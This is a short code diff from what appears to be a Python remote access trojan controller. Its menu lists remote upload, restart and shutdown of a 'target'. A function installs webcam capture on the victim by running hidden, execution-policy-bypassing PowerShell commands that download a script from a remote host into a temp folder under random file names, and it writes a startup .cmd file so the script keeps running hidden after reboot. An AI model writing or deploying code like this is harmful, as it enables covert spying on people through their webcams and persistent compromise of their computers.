@@ -48,8 +48,8 @@ options_menu = """
                 [6]  remote upload 
                 [7]  restart target
                 [8]  shutdown target
-                [9]  Install Webcam Capture
-                [10] Fetch Webcam Capture
+                [9]  Install Webcam Capture [Partially Done]
+                [10] Fetch Webcam Capture [Not Implemented]
 
             [+] Options:
                 [-h] or [--help]     ---   help
@@ -191,7 +191,7 @@ def install_camcap(ipv4,pword,temp_dir,startup_dir):
     print("[*] Downloaded cam caputre...")
     webcam_download = f"""powershell powershell.exe -noP -ep bypass -w hidden -c \"iwr -uri {remote_path}/webcam_cap/webcam.ps1 -outfile {temp_dir}/QKlYTmHhCDy/sjzQVatArhvlHXifK.ps1\" """
     print("[*] Downloaded webcam script...")
-    controller_command = f"""powershell -noP -ep bypass -w hidden add-content -path \\"{startup_dir}/meuqSoQyrCUvhGjpV.cmd\\" -value \\"powershell -noP -ep bypass -w hidden start-process powershell.exe -windowstyle hidden "{temp_dir}/sjzQVatArhvlHXifK.ps1" \\" """
+    controller_command = f"""powershell -noP -ep bypass -w hidden add-content -path \\"{startup_dir}/meuqSoQyrCUvhGjpV.cmd\\" -value \\"powershell -noP -ep bypass -w hidden start-process powershell.exe -windowstyle hidden "{temp_dir}/QKlYTmHhCDy/sjzQVatArhvlHXifK.ps1" \\" """
     print("[*] Downloaded controller script...")
     remote_command(ipv4,pword,camcap_download)
     remote_command(ipv4,pword,webcam_download)
